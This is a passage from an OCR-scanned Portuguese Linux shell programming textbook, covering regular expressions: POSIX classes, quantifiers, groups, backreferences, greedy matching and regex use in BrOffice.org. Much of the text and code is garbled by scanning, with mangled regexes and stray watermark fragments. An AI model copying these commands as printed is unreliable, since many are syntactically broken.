crevendo novamente vem: 
( [ :alnum: J 1 
Repare agora que temos uma lista formada por somente uma classe, e 
para ser lista a classe precisa estar envolvida pelos colchetes que definem 
a sintaxe desses Representantes. 
Vamos supor que a variável $EndHw tenha o endereço de hardware (mac 
addres) de um computador. Usando as classes POSIX, fica muito fácil mon-
tar uma Expressão Regular para verificar se o valor da variável é válido ou 
não. Veja este fragmento de código: 
H (( $EndH>l =· [ [ :xdigit : IJ[ [ :xdigit: : I J: ( [: xdigit : ll .J 
l i: xdi git : I J: I I : xdigh : J I I ( : xdigh: I J : I I: ;:digit : J I .J 
I I: xdi gi t : I 1 : I I : xdigit : 1 I I I : xdigi t : I I : I I: xdigit : I I I I : xdigi t : I J I 1 
then 
echo Endereço de hardware a.pz:ovado 
el se 
echo Endereço de hardware com formato irregular 
fi 
Pode parecer complicado, mas não é mesmo! Vamos analisá-lo: 
Como nós vimos na seção "E tome de test" o comando r 1 ... 1 1 é um 
intrínseco (builtin) do Shell que equivale ao comando test, e que, com o 
operando =-, compara Expressões Regulares. 
Dentro do comando test, notamos que a dupla 1 r :xdigit : 11 r 1 : xdi-
git : 1 1: se repete 6 vezes. Isso significa dois hexadecimais (algarismos 
que variam de o a t) seguido de dois pontos 1: ) , exceto na última dupla, 
que não tem os dois pontos <, ) ao fim. Ou seja, este é o mac propriamen-
te dito. 
Esse último exemplo foi feito de forma muito rudimentar devido à falta 
de bagagem de Expressões Regulares. Quando estudarmos Grupos, vere-
mos este código reduzir-se a menos de um terço deste. 
~1atcria com d r bs auto a.~s 
Expressões regulares 
393 
Sequências de escape 
Essas nos já vimos ao longo do livro e estão descritas na seção relativa ao 
comando tr, porém, cada uma delas representa um único caractere e, por 
isso, não se enquadram aqui; porém, elas têm extensões que representam 
cada uma uma gama de caracteres, e são essas que nos importam no es-
copo das Expressões Regulares. Vejamos: 
Escape 
Significado 
\3 
Casa espaços em branco, \r ou \t 
\S 
Negação de \.s: casa o que não for espaço em branco, \r ou \t 
\w 
Casa letras, dígitos, ou · _ · 
I 
\ W 
Negação de \ w 
Exemplos: 
$ cat -vet DOS.txt 
&sce arquivo !oi'M$ 
gerado por um ttp'!1$ 
mal feito do DOS'M$ 
ou rwi-n para o Linux . "'M$ 
Repare que ao final de cada linha existe um ·~1 antes do cifrão ( $ l . Isso 
ocorre porque no DOS/rWin o fim de linha precisa de um CR (carriage re-
turn, cujo ascii é 13, octal \015 e é representado pela sequência de escape 
\r) e de um LF (line feed, cujo ascii é 10 , octal \012 e é representado pela 
sequência de escape \n), ao passo que os UNIX/LINUX usam somente um 
LF. Esses dois caracteres de controle são mostrados pelas opções -vet do 
comando ca t como ' Me cifrão <Sl , respectivamente (veja o comando cat 
no capítulo 3 da primeira parte deste livro. 
Veja o que acontece agora: 
s sed '•1\ s/ x/ q' DOS.tx t 
Est exarqui voxfoi:-: 
geu1 doxporxum;: ftpx 
~lxfe i~oxdoxDOSx 
ouxrwi nxparaxoxLinux . x 
~1atcria com d r bs auto a.~s 
394 Programação Shell Linux 
Essa linha de comandos trocou os finais de linha do arquivo, além dos 
caracteres em branco por um x . Como o arquivo é do estilo DOS, termi-
na com um CR e um LF. Vamos usar o comando tr para remover os CR 
(\r ) . 
$ t r - d ' \r ' < DOS.txt ( tee arq. DOS I cat - vet 
este arquivo foi$ 
ge~ado por um ftp$ 
m•l feito do DOS$ 
ou rWi n pa.::a o Linux . $ 
O tr -d removeu os CR e o comando t ee jogou a saída do t r para o 
arquivo a r q . oos e para o comando cat com a opção -vet, para que você 
veja que o CR já era. Vamos executar o mesmo sed novamente: 
$ sed 's/ \s/x/g' arq.DOS 
Estexarqui voxfoi 
ge rador.po.rxumxftp 
malxfeitoxdoxoos 
OUXt\Vil1Xp<ltiiXO>:.Lin ux . 
Como você viu, o x no fim da linha foi causado pela sequência de esca-
pe \s, do sed, atuando sobre o CR e não sobre o LF. 
Vamos agora ver o uso do \w (de word) usando o mesmo sed: 
$ s ed •s/\w/x/ g' <<< 'Batatinha frita l , 2 , 31' 
xx xxxxxxx xxxxx x, x, x! 
$ •ad •s/\W/X/9' <<< ' Ba tatinha frita l, 2, 3! ' 
na t.a d. nha x f r i t.ax l x :.:2 :-:x 3x 
Ou seja, a sequência de escape \•r casou com todas as letras e todos os 
algarismos. Se houvesse sublinha 1 , • ele também casaria. No exemplo 
seguinte. o w casou exatamente o oposto. 
Agora vamos aumentar nosso arsenal. A primeira novidade é o ponto de 
perguntação (ou será interrogação?) ( ? ) , que também é um quantificador, 
que casa o caractere anterior zero ou uma vez apenas, ou seja, ele pode 
ser encarado como opcional, pode existir ou não. 
Então para fazermos uma ER que case a palavra "revista" no singular ou 
plural, basta: 
.revistas? 
Mate 
com d re l s 
1 • s 
Expressões regulares 
395 
Exemplos: 
$ Manchete="A obra foi revista e publ.icada nas revistas" 
$ grep -Eo 'revistas? ' <<< "$Manchete" 
revi sta 
révist.as 
Só para relembrar, a opção - E do 9 rep serve para usarmos Expressões 
Regulares estendidas (como é o caso do opcional <?> ) e a opção - o é 
usada para que o gr ep devolva somente o trecho casado. Dessa forma 
vimos que ele casou tanto r evista quanto revistas . 
Sendo a letra s a entidade imediatamente anterior à i nterrogação (? l , 
ela torna-se opcional, atingindo o objetivo. 
Com os três quantificadores vistos até então, percebemos que podemos 
definir com ERs quantidades de O, 1 ou muitos. Mas e no caso de procu-
rarmos, por exemplo, um número de cinco dígitos? Claro, num primeiro 
momento, o mais óbvio seria: 
[G-9] [ G-9] [0-9] [ 0 - 9] [ G-9] 
Funciona, mas, além de redundante, como faríamos se fossem quinze, 
vinte dígitos? Para se ter um controle mais refinado, temos o quantificador 
numérico: as chaves 1 1 l l . Dentro delas se coloca a quantidade desejada 
de ocorrências da entidade anterior. No exemplo anterior do número de 
cinco dígitos, faríamos: 
(0- 9 ] { 5) 
ou seja, qualquer número entre O e 9, cinco vezes. Atenção aqui, não é o 
mesmo número repetido como 66666 e sim qualquer número do intervalo, 
cinco vezes, como 73956 por exemplo. 
Mas o quantificador numérico é muito mais flexível que isso, pois além de 
números fixos de repetições, permite a definição de intervalos, com a sintaxe: 
(ii, fi ) 
onde: ii= início de intervalo e n = fim de intervalo. Assim: 
z{3,5 ) 
que quer dizer: a letra z de três até cinco vezes, o que casaria zzz , zzzz 
e zzzzz . 
~1atcria com d r bs auto a.~s 
396 Programação Shell Linux 
Além disso, podemos ter uma definição mais relaxada como: 
z (5} 
ou: 
z ( 3,) 
que equivaleria a "exatamente 5" ou "no mínimo 3" letras z , respectivamente. 
Exemplos: 
$ scd - r 's/e(3)/ www./g' <<< eeej ulioneves . c om 
\•1\'IW . julioneves .com 
$ grep -Eo •a{2,) ' <<< "Um espirro faz assim: aaat chim'' 
aaa 
Nesse último, usamos as Expressões Regulares expandidas do grcp 
(opção -e;) e a opção -o que mostra somente o que casou. Daí vimos que 
apesar de haverem diversas letras a no texto, a Expressão Regular só ca-
sou com aaatchim, onde, como solicitado, haviam pelo menos duas letras 
a consecutivas. 
Podemos agora dar uma melhoradinha na nossa rotina de critica do mac 
address, que vimos quando falamos das classes POSIX. Veja: 
1f ( ( $Endl!w =· r ( : r.digit : ]] (2 ) : (r : r.digit : ] )(2) : ( ( : xdigit : ]] ..J 
(2):[ r :xdigi t : ]] f2) : [[ : xdigit : ] j (2 1:[ r: xdigit :j j{ 2 ) l i 
then 
echo Endel'eço de harcl\\•are aprovado 
else 
echo Endereço de ha.cdwa.re com formato irregul ar 
ti 
Melhorou, mas quando aprendermos as ferramentas que virão logo a 
seguir, ficará muito melhor. 
Dê uma revisada em todos os quantificadores. Os mais atentos deverão 
perceber que os quantificadores *, + e ? são equivalentes a r o, 1, 1 1, 1 
e r o, L 1. Pois é. Fazem a mesma coisa, mas os primeiros são mais curtos 
e fáceis de ler. 
Até agora sempre que os quantificadores foram referenciados, se disse 
que eram relativos à "entidade" anterior. Essa entidade deve-se ao fato de que 
as ERs podem ser agregadas, ou seja, pode-se concatenar ERs, mesclando 
ferramentas e construindo-se ERs tão complexas quanto se necessite. 
~1atcria com d r bs auto a.~s 
Expressões regulares 
397 
Outros 
Lembra que eu disse que os metacaracteres, para efeito didático, se divi-
diam em 4 grupos: Âncoras; Representantes; Quantificadores e Outros? 
Mas por que Outros? Você vai me perguntar. 
Ora, porque não se encaixam em nenhum dos grupos anteriores. 
Veja quais são os componentes do grupo Outros: 
. 
ER 
Nome 
Significado 
\ 
I escape 
Tira os poderes do caractere seguinte 
I 
11 ou 
Escolhe entre~· 
. 
( ) 
J grupo 
Reúne caracteres 
\1 ••• \9 ~ retrovisor 
Retoma texto~·-~~ 
.;. 
~ t' •... 
Algumas vezes você não deseja que um metacaractere <. A s * + ? \ 
[ 
< t 1 1 seja interpretado como tal, então precisamos tirar seus superpo-
deres. Existem duas formas de fazer isso: 
• Colocando o metacaractere dentro de uma lista (como já havíamos 
visto); 
• 
Precedendo o metacaractere com uma contrabarra. 
Exemplos: 
Vamos montar uma linha de comandos para criticar um número de CEP, 
que, como você sabe, tem o formato NN.NNN-NNN, onde cada N equivale 
a um algarismo de zero a nove. Como primeira tentativa vamos fazer: 
$ li $cep =-
10-9](2}. 10-9](3}-10-9](3} } I H echo CEP $cep OK 
Agora vamos executá-la duas vezes. A primeira com a variável 
cep=l2 . 345- 678 e a segunda com cepal23456-7B9 : 
$ cep=l2.345- 678 
$ 11 $cep =- 10-9](2}.10- 9)(3}-10-9](3} JJ && echo CEP $cep OK 
CEP 12 . 345- 678 OK 
398 Programação Shell Linux 
S cep=l23456 - 789 
$ [ [ $cep =- [0-9] [ 2). [0-9)[3}-[0-9]{3} )) $.& e cho CEI? Scep 0 1( 
CEP 123456- 789 OK 
Hiii, a segunda execução deu um resultado imprevisto, pois o número do 
CEP não era válido. Vamos botar uma contrabarra antes do ponto <. J e 
vamos testar novamente: 
$ ( ( $cep • -
[0- 9){2)\. (0- 9){3) - (0 - 9)(3) ) ] && echo CEP $cep OI< 
$ 
Haaa, agora sim! Agora não deu a mensagem dizendo que o CEP 
estava certo. Isso ocorreu porque o ponto 1. 1 é um metacaractere que 
casa com qualquer caractere. Quando o precedemos com uma contra-
barra, ele perde seus superpoderes e passa a ser simplesmente o literal 
ponto 1. J. 
Agora que você está crente que já acabou a Expressão Regular e está 
tudo funcionando beleza, veja isso: 
$ cep=l23.456-78 90k 
$ [ ($cep =- [0-9) [ 2}\ .{0-9) [ 3 } )] && echo CEP Scep OI< 
çg p 123 . 456- 7890 OK 
Repare que no número informado c 123 . 456-78 90), o pedaço 23 . 456-789, 
casa com a Expressão Regular que montamos para o CEP. Para que eela 
figue 100%, é necessário colocar-lhe limites com as âncoras, e para isso 
faremos: 
$ [ [Scep - - '[0- 9] [2)\.[0 - 9] [3 }- (0- 9 ] (3)$]] && echo CEP Scep OK 
$ 
Como você viu, agora não apareceu a mensagem dizendo que o CEP 
estava OK. 
A Expressão Regular também funcionaria se colocássemos uma borda 
{\bJ antes e outra depois, nos lugares do circunflexo t'J e cifrão tS J, res-
pectivamente. 
Suponha que, de um rol de frutas, você queira aceitar somente pe r a ou 
uva ou maç ã . Para isso constrói-se uma Expressão Regular usando o alter-
nador, que é representado por uma barra vertical 1 1 1 . Vejamos: 
~1atcria com d r bs auto a.~s 
Expressões regulares 
399 
Exemplos: 
$ cat f~;utas 
abacate 
ma c à 
morc1ngo 
pera 
-.::itnqerina 
uva 
S qrcp -E 'pe ra luva(maçã• frutas 
maçâ 
pera 
uva 
Não se esqueça que uma lista é uma espécie de ou para somente uma 
letra. Assim cal [mdccvi a, é o mesmo que calma tcalda tcalca 1 calça I calva. 
Mas quando isso for possível, lembre-se sempre de usar a lista. 
Você verá que o uso dos parênteses formando um grupo restringe a 
abrangência do ou 11 1, e pode parecer estranho, mas é essa limitação 
que lhe dá mais poder. 
Como numa expressão matemática, os parênteses definem um grupo, 
e seu conteúdo pode ser visto como um bloco à parte na expressão. Agora 
as ERs começam a ficar divertidas. 
Exemplo: 
Com o uso de grupos podemos melhorar aquele fragmento de código 
que usamos para criticar o endereço de hardware (mac address). Veja: 
it (( s end!!w =-
(l[ :xcligit:)!(2) : )(5! [[: xdigit : )J(2} li 
then 
echo El)dereco de hiU:dware aprovado 
el se 
echo Endereço de hard\·!are com formato irreqular 
fi 
Note que com o uso do grupo (parênteses) foi possível montar um conjunto 
formado por 2 dígitos hexadecimais e dois pontos 1: l , o que possibilita 
fazer esse grupamento como um todo ocorrer 5 vezes, ficando de fora so-
mente os 2 últimos dígitos hexadecimais, porque estes não são sucedidos 
por dois pontos ( : ) . 
(governa) ?dor 
Mate 
com d re l s 
l • s 
400 Programação Shell Linux 
A entidade que a interrogação deixou opcional nesse caso foi todo o 
agrupamento dos parênteses, então essa ER casa governador e dor. 
E ainda, como ferramenta complementar ao agrupamento, temos a alter-
nância, representada pela barra vertical 1 . Seriam alternativas possíveis a uma 
posição, um "OU" lógico. Assim, vamos fazer uma ER que case algumas possi-
bilidades de cargos públicos que poderíamos ocupar e não nos preocuparmos 
mais em aprender essas expressões complicadas ... Comecemos com: 
(governalsenalverea)dor 
sem a interrogação <?) no grupo, deixamos dor atrelada aos três cargos 
públicos de uma só vez: governador, senador e vereador. Mas é claro, 
não podemos nos esquecer da ala feminina, para empregar a mulher, a 
irmã, ... incluiremos uma letra a opcional no final : 
(governalsenalverea)dora? 
Mas ainda faltam os primos, cunhados e afins, então cargos de vice pra 
eles: 
(vice-)?(governalsena Jverea)dora? 
Uau! Nossa expressão agora reconhece doze cargos públicos: 
governador 
governadora 
vice-governador 
vice-governadora 
senador 
senadora 
vice-senador 
vice-senadora 
vereador 
vereadora 
vice-vereador 
vice-vereadora 
Expressões regulares 
401 
Agora podemos nos tranquilizar. a família toda está garantida. Bem, dei-
xando a politicagem de lado, creio que é perceptivel o quão poderosa é a 
sintaxe das ERs, que com poucas ferramentas se consegue ser bem espe-
cífico, conseguindo dizer muito com pouco. 
Mas eu já falei que usando o agrupamento ganha-se um brinde? Não? 
Pois é, cada vez que se usa os parênteses, seu conteúdo (o que a ER ca-
sou) é automaticamente armazenado num registrador interno para poder 
ser usado mais à frente na expressão. O nome é feio: "referência retroa-
tiva", mas essa caracteristica é ótima para procurar coisas repetidas. Por 
exemplo, para procurar a palavra quero-quero, a ER seria: 
(quero)-\1 
A forma de se referir ao conteúdo do registrador é um número de 1 a 9 
com uma barra invertida na frente. Chama-se isso de "número escapado". 
Um uso muito comum dessa referência é a procura de palavras repeti-
das num texto. 
Exemplo: 
Continuando o nosso corretor ortográfico, vamos montar uma ER que pro-
cure duas palavras iguais seguidas que tenhamos digitado inadvertidamente. 
ER: ((A- Za - z ) +) \1 
ou seja, qualquer cadeia de letras maiúsculas ou minúsculas seguida de 
um espaço em branco e seguida da mesma cadeia novamente. 
Pode-se fazer uso de até nove registradores sempre contando da es-
querda para a direita. Então algo como: 
Exemplo: 
Já (vi ) o (quero) - \2 (hoj e), mas \ 3 nao \ l m aqm para vé- l o 
é traduzido para: 
Jil vi o quero- quero hoj e , ma!t ho)e nâo vim aqu1 pat:<l vê- lo 
Note que os parênteses não alteram o sentido da ER, apenas servem 
como marcadores. Com isso já demos um grande salto no aprendizado das 
ERs. E como pequenos exemplos são melhores e valem mais que diver-
sas páginas de teoria: 
Mate 
com d re l s 
l • s 
402 Programação Shell Linux 
Vamos ver um exemplo prático do uso de grupos com retrovisores. Su-
ponha que temos um cadastro de aniversariantes com o seguinte formato: 
cat aniv 
1919-11-08 Hedy Couti nho 
1947-07-05 Si lvina Duarte 
1980- 01- 17 Ju1iana Duarte 
1984- 11- 08 Paula Duarte 
Para procurar os aniversariantes de um determinado mês seria muito 
trabalhoso, pois ele está ordenado por ano de nascimento. Para listar os 
aniversariantes de Novembro (11) montamos o seguinte sed. 
$ sed -rn ' s/[0-9]{4 ]-11- [0-9] {2} ( .k}/\1/p' aniv 
Hedy Coutinho 
Paul a Duarte 
Nesse sed, definimos uma Expressão Regular para casar o ano 1 ro- 91 
r 411 , - 11- (que é o mês 11 entre seus dois separadores), o dia de nasci-
mento 1 ro- 9){21 1, um espaço em branco (que é o separador entre a data 
eonome)eonome (( . *JJ . 
Como a Expressão Regular do nome está entre parênteses, o texto ca-
sado foi armazenado para uso futuro. Como o sed usava o comando de 
substituição (si, todo o texto casado foi substituído pelo valor que casou 
com o nome 1\1 1 , pois este é o retrovisor que recuperou o que havia sido 
previamente armazenado. 
A opção -n do sed diz para ele só jogar para a saída, o que for ordenado 
e o comando print lpl , que está no fim da linha de comando, diz ao sed 
para imprimir as linhas casadas. Veja o que aconteceria se não usássemos 
a opção - n juntamente com o comando print <Pl: 
$ sed - r 's/ [0-9]{ 4 ) - 11- [0-9]{2 ) (.*)/\1/' aniv 
Hedy Coutinho 
1947- 07- 05 Silvina Duarte 
1980- 01- 17 Juliana Duarte 
Paula Ouaxte 
Ou seja, jogaria para a saída o nome dos aniversariantes de Novembro, 
mas mandaria também os registros inteiros das outras pessoas. 
~1atcria com d r bs auto a.~s 
Expressões regulares 
403 
Esse é um exemplo complexo, porém completo. 
Conforme prometido, vamos agora corrigir o bom e velho bestei r a . txt . 
Ele está assim: 
$ c~t - vot bostoira.txt 
Eu vi um velho com um fole velho na.s costas 
. Tanco f ede o fole do 
velho , quanto o velho do fole fede . $ 
s 
um de.safi o"'I:diga i s so bem rz.t-CH- !pido ! $ 
Repare na última linha que temos um ' r entre desafío e os dois pontos 
(: ) etemosainda rN- CM- !pi do. O ~r é uma <TAB> queestánotextoe 
11-cM- ! É a representação da letra ·a • acentuada (á 1 • 
Primeiramente, vamos eliminar os espaços em branco e as <TM> entre 
as palavras e a pontuação: 
$ s<>d - r •s/ (((:alnum:J))[ ] ((( :punct:] J) /\1\2/g' besteira.txt I toe 
besteira.txt 
Eu \ri um ve lho c om um fole velho nas costas . Tanto fede o fole do velho, 
quanto o vel ho do fol~ fcd~ . 
Um desaüo:di ga i s!lo bem z:ápido ! 
Como não sabia os textos que iriam casar, usei os parênteses para mon-
tar 2 grupos: 
• 
O primeiro casando letras e números (poderia ter usado < 1 r: a l-
num: Jl +l para casar palavras); 
• 
O segundo com os caracteres de pontuação. 
Entre os dois, há uma lista que em seu interior tem um espaço em bran-
co e uma <TAB> (poderia ter usado \s ou r: space : 1 ). 
Dei a saída para um tee, porque este a divide para o arquivo indicado 
(no caso best.eira. txc) e a saída padrão. Se não fosse para mandar para a 
saída padrão, poderia ter usado somente a opção - i do sed. 
Na saída do sed, juntei o texto casado pelo primeiro grupo ( \ 1 ) com o 
texto casado pelo segundo !\21, dessa forma, jogando fora os espaços 
em branco e os <TM> . 
~1atcria com d r bs auto a.~s 
404 Programação Shell Unux 
Vamos agora pegar este arquivo já modificado e procurar pelos caracte-
res de pontuação que não estão separados por um espaço em branco da 
palavra seguinte. 
$ 
aed -r 's/([(:punet:])) ([[: a lnwn:]]+)/\1 \2/q' 
besteira.txt 
tee 
besteira . txt 
Eu v1 
u~ velho com um fole velho nas costas . Tanto fede o fole do velho, 
quanto o velho do :o!e fede . 
IJ"' desaho : d>.qa isso bem rápido! 
Os grupos formados agora foram para os caracteres de pontuação e 
para palavras, mandando para a saída o texto casado pelo primeiro grupo 
(um caractere de pontuação), um espaço em branco e o texto casado pelo 
segundo grupo (uma palavra). Para o tee, vale a mesma observação do 
exemplo anterior. 
Mas poderíamos fazer isso tudo em um único sed. Veja: 
$ sed -ri 's/([[: alnwn:]])[ ]([[ :punet:]))/\1\2/q ; s/([[:punct: ]]) .J 
([[ : alnum: ]]+)/\1 \2/q' beateira.txt 
$ cat besteira . txt 
Eu vi um velho com um fole velho nas costas . Tanto fede o 
~ole do velho, 
quanto o velho do fole fede . 
, . .., d•·sa'oo : diga iss"> b,•• 
r~pido! 
Pronto! Agora só falta tirar a penúltima linha, que está vazia: 
$ aed -i '/~$/d' beateira .txt 
$ cat beateira.txt 
Eu vi um velho com um fole velho nas costas. Tanto fede o fole do velho, 
quanto o velho do fole fede . 
~m desa:io : diga isso bem rápido! 
Para remover a linha vazia, pesquisei por ·s, isto é, o início está junto 
do fim e usei o comando d (delete) do sed. 
Se quisesse remover as linhas vazias ou as que continham somente 
espaços em branco e/ou <TAB> , deveríamos fazer: 
$ sed -i '/A [ ]*$/d' beateira.txt 
Expressões regulares 
405 
Isto é, entre o início n 
e o fim tSJ da linha montei uma lista formada 
por espaço em branco ou <TAB> e seguida por um asterisco 1 • J . Quando 
o asterisco 1 • 1 representa zero ocorrências, a linha será vazia, caso con-
trário, entre o início e o fim da linha poderão haver diversas ocorrências, 
mas somente destes caracteres. 
Mais uma dica sobre correção de texto: é comum repetirmos uma pa-
lavra quando estamos escrevendo um texto (eu mesmo me considero um 
escritor gago ... :). Podemos corrigir isso procedendo assim: 
Consideramos que palavras são formadas por letras, números e subli-
nhados 1_1 • Então vamos montar um Expressão Regular para isso e repe-
ti-la com o uso dos retrovisores. 
1ª Tentativa 
Fiz uma lista com maiúsculas, minúsculas, algarismos e sublinhado, ou 
seja, tudo que pode formar uma palavra. O sinal de adição 1 + > após a lista 
diz que ao menos um de seus componentes tem de ocorrer pelo menos 
uma vez. Isso tudo está entre parênteses de modo a formar um grupo, que 
salvará o texto casado com esta Expressão Regular. Seguindo esse grupo 
vem um espaço em branco que seria o fim da 1" palavra e o retrovisor ( \ l l 
que traz o texto salvo pelo grupo que descrevemos. Vamos ver se isso 
funciona. Parece que sim ... Para testar vamos montar um sed que elimine 
uma das repetições. 
$ sed - r 's/ ( [A- Za - -.0- 9_ )+) \l/\1/ ' <<< 'Gosto de de delic i as ' 
Gos~o de del~cias 
Parece que funcionou, vamos repetir o exemplo, agora com o texto já 
corrigido: 
$ sed - r 's/( [A- Za-:0-9_ ]+) \1/\1/' <<< 'Gosto de delicias ' 
Gosto delícias 
liiihh, a preposição de foi pro brejo! Vamos usar o grep com a opção - o 
para entender o que aconteceu: 
$ grep -Eo ' ( [A- Za- z0-9_)+) \l" «< ' Gosto de delicias' 
de de 
Mate 
com d re l s 
l • s 
406 Programação Shell Linux 
Ahh, então foi isso! Realmente a preposição ' de • se repete na primeira 
sílaba de dedilhar. Podemos acabar com esta confusão usando as bor-
das (\bl . Então vejamos: 
$ sod - r 's/\b((A- Za- z0 - 9_ )+) 
\1~/\1/
' <<< ' Gosto do do delici as ' 
Gosto de delicias 
$ sod -r •s/~((A-Za-z0-9_ )+) \1\b/\1/ ' <<< ' Goseo do delicias • 
Goseo de del icias 
Com as três bordas (dois \b : um no início e outro no final e o espaço em 
branco entre as palavras) a expressão funcionou como esperado. Lembre-
se sempre de usar Âncoras quando possível. A falta delas provoca erros 
dificílimos de serem detectados. 
Exemplos: 
ER 
Casa as Cadeias 
[abcl 
abc 
[.a -cl 
abc 
:.:• 
<nada> z zz zzz zzzz ... 
z + 
z zz zzz zzzz ... 
z(2) 
zz 
zz z {2, 4) 
zz zzz zzzz 
z <. 3) 
<nada> z zz zzz 
z {3. J 
zzz zzzz zzzzz ... 
<tln>u 
tu nu 
(aj ) • 
<nada> aj ajaj ajajaj ... 
[a j ]• 
<nada> a j aa ajjaaj ... 
(a I j l • 
<nada> a j aa ajjaaj ... 
(tu) \ 1 
tu tu 
Como o asterisco < •J quantifica a entidade anterior zero ou mais vezes, 
ou seja, pode não ter, ter apenas um, ou ter vários, é o mesmo que dizer: 
•em qualquer quantidade". Sendo assim, a expressão a • casa a letra a em 
qualquer quantidade, mesmo nenhuma. O mesmo com tA- ZI • , para casar 
letras maiúsculas em qualquer quantidade. Mas e o famigerado . *? 
~la:cnu 
mJo 
Expressões regulares 
407 
Recapitulando, o ponto <.) casa "qualquer caractere". E qualquer é 
realmente qualquer caractere, seja uma letra, um número, um simbolo. 
um <TAB>, um espaço em branco, etc., e ai se forma a mágica do curinga: 
"qualquer caractere, em qualquer quantidade". Ou simplesmente o nada 
e o tudo. O nada, pois "qualquer quantidade" também é igual a "nenhuma 
quantidade". Então é opcional termos qualquer caractere, não importa. As-
sim, uma ER que seja simplesmente". *" e mais nada sempre será válida e 
casará mesmo uma linha vazia. O tudo pois "qualquer quantidade" também 
é igual a "tudo o que tiver''. E é exatamente isso o que o asterisco l*l faz, 
ele é guloso, ganancioso, e sempre tentará casar o máximo que conseguir 
(cara estranho, não? Ficar casando assim ... ). Repita comigo: o máximo 
que conseguir. 
É muito comum, ao escrever uma expressão regular, você definir alguns 
padrões que procura e, lá no meio, numa parte que não importa, pode 
ser "qualquer coisa", você coloca um ".*"e depois continua a expressão 
normalmente. 
Um bom exemplo disso é procurar por um nome de pessoa numa intro-
dução de uma carta ou e-mail: "Prezado Senhor Fulano," onde Fulano pode 
ser qualquer nome, com ou sem sobrenome, e termina a frase com uma 
vírgula. Nesse caso o curinga é extremamente útil e sua expressão regular 
fica: 
ER: Prezado Senhor . •, 
Mas atenção! Apesar de ser bem difundido o uso do curinga, às vezes 
ele pode casar mais do que se queira. Por exemplo, suponhamos que a li-
nha em questão na carta esteja "Prezado Senhor Fulano de Tal, bom dia,". 
A expressão regular anterior usando o curinga casará a linha toda, até a 
última vírgula (lembre-se "o máximo que conseguir"), pois o ponto casa 
"qualquer caractere" e a primeira vírgula entra nesse grupo. A segunda 
vírgula não entra, pois logo após o curinga temos uma vírgula literal na 
ER, funcionando como âncora, então "qualquer coisa" antes dessa âncora 
casa no curinga, sendo "Fulano de Tal, bom dia" e não só o nome como 
desejado. 
408 Programação Shell Linux 
Nesse caso, vale uma dica de ouro ao escrever expressões regulares: 
"seja específico•. Sendo assim, sabemos que um nome de pessoa só pode 
ter letras maiúsculas e minúsculas, com espaços em branco entre nome e 
sobrenome, então refinaremos a expressão para: 
ER : 
~rezado Senhor (A-Za-z ]• 
Último caractere no colchete é branco 
acabando com o problema do curinga guloso. 
É claro, em muitas situações, essa "gulodice" do curinga é vital para 
casar um trecho, mas é sempre bom ter em mente que é esse o compor-
tamento dele, para não casar mais do que você desejava. Fique sempre 
atento, porque da mesma forma que o asterisco, o "+" e o " ( 1, 5 1" são 
gulosos, sempre casando o máximo possível. 
Para finalizar, certifique-se de ter entendido o significado das três frases 
seguintes e o uso do curinga não será um problema: 
"qualquer caractere, em qualqu:er quantidade" 
-
"casará o máximo que conseguir'' 
-
"seja específico" 
A base é isso, o que vem pela frente agora é aplicação disso no 
mundo real, exemplos práticos, que podem ser executados na linha de 
comando e detalhes que não são documentados, que só se aprende na 
prática. 
Expressões Regulares (no BrOffice.org) 
Apesar de não ter nada a ver com Shell, todos os "shelleiros" usam o 
BrOffice.org. Como você já sabe o básico de Expressões Regulares, vou 
inserir esta seção como uma colher de chá (ou será colher de Shell? :). 
Obviamente, não mostrarei tudo novamente, mas somente as diferenças 
que já testei entre as sintaxes das Expressões Regulares do Shell e do 
BrOffice.org, dando ênfase para as surras que tomei para descobrir essas 
diferenças. 
~1atcria com d r bs auto a.~s 
Expressões regulares 
409 
As surras foram maiores porque à época não se achava documentação 
sobre o uso de Expressões Regulares no BrOffice.org. Atualmente, existe 
um bom manual em http://wiki.services.openoffice.org/wiki/Oocumentation/ 
How_Tos/Regular_Expressions_in_Writer, o qual algumas vezes consultei 
para escrever este texto. 
Obs.: quero destacar que a última manutenção que dei neste texto foi no 
verão de 201 O e atualmente existe um movimento no BrOffice.org para mu-
dar a máquina (engine) de Expressões Regulares para um novo modelo, 
descrito em http://userguide.icu-project.org/strings/regexp. Veja bem: isso 
não é certo que vá acontecer, e, caso ocorra, as mudanças de sintaxe não 
incompatibilizarão a atual. 
Oito isso, vamos ao que interessa. 
Onde usar Expressões Regulares no BrOffice.org 
Você pode usar Expressões Regulares nas seguintes situações: 
No Writer.· 
• 
Editar -+ Localizar e Substituir; 
• 
Editar -+ Alterações -+Aceitar ou Rejeitar -+ Tab Filtro 
No Cale: 
• 
Editar-+ Localizar e Substituir; 
• 
Dados -+ Filtro-+ Filtro Padrão & Filtro Avançado; 
• 
Algumas funções como SOMASE, PROCURAR e outras. 
No Base: 
• 
No comando Find Record (isso foi um chute que dei, porque não co-
nheço o Base) 
As caixas de diálogos que aparecem quando você usa os comandos 
acima geralmente têm uma opção para usar Expressões Regulares (que 
normalmente está desligada). Por exemplo: 
~1atcria com d r bs auto a.~s 
410 Programação Shell Linux 
localizar e substituir 
x 
H 
___ 
..... 
toc:oiiwtodos 1 
Subst:lbnr aor 
, Menos gpç6es :. 1 
Sgmente a sek!çlo atual 
Diferenças na lógica de uso 
>iitd• 
sub<tkui( I 
Subltlt.Uif todos I 
AtrihutõS:"j 
rorm~ 
Existem diferenças de sintaxe com as Expressões Regulares que apren-
demos, e existem também diferenças na lógica de aplicação. Essas são 
mais chatas para os veteranos de Expressões Regulares sob o Shell, pois 
é necessário uma mudança na forma de raciocinar. Veja estes casos: 
Havia notado um erro no meu livro, mas esqueci de anotar o número da pá-
gina. Quando fui fazer a alteração, a única coisa de que me lembrava era que o 
erro estava em uma variável do Shell. O que fiz? Montei uma Expressão Regular 
começando por cifrão ( s > e casando letras maiúsculas, algarismos e sublinha-
dos u . e esses algarismos não podiam suceder o cifrão ( s > . Era assim: 
$ (J\- Z_) + ( 0-!JA-Z_)' 
Mas, apesar de certa. a Expressão Regular não funcionava pois casava 
com as variáveis em minúsculas também. Demorei muito para descobrir 
que o check button "Diferenciar maiúsculas de minúsculas" é que decide 
quanto à caixa das letras (veja a figura anterior). 
Um outro problema de diferença de lógica é que no BrOffice.org as Ex-
pressões Regulares dividem o texto a ser pesquisado em porções e exami-
nam cada porção separadamente. 
Expressões regulares 
411 
No Writer, o texto é dividido em parágrafos e o que define um parágrafo 
é a porção de texto entre um enter ou um hard enter (.J) (caractere não 
imprimível obtido com <SHIFT>+<ENTER> também chamado de new line) e 
outro desses. 
Assim sendo, mesmo que a palavra parece esteja sendo exibida no 
